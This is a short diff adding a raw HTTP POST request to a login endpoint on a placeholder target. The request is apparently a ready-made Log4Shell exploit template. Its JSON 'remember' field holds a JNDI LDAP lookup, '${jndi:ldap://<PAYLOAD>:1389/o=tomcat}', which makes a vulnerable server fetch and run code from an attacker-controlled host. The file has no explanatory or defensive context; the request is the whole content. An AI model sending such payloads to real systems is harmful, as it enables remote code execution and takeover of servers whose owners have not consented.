@@ -1,0 +1,18 @@
+POST /api/login HTTP/2
+Host: <TARGET> 
+Content-Length: 109
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Sec-Ch-Ua-Platform: "macOS"
+Content-Type: application/json; charset=utf-8
+Accept: */*
+Origin: https://<TARGET>
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://<TARGET>/manage/account/login?redirect=%2Fmanage
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"username":"asdf","password":"asdfas","remember":"${jndi:ldap://<PAYLOAD>:1389/o=tomcat}","strict":true}
